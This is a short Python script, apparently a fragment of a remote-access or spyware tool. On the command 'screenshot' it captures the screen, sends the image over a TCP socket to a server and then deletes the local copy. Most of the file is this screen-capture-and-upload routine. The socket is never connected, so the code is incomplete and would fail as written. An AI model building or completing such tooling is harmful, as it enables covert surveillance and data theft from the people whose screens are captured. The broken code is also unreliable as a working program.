import pyautogui
import os
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

command = input('Command >>>')


def upload_file(file_name): # upload file to server
    f = open(file_name, 'rb') 
    sock.send(f.read()) # send to the server

if command == 'screenshot':
    image = pyautogui.screenshot()
    image.save('scrn.png')
    upload_file('scrn.png')
    os.remove('scrn.png')
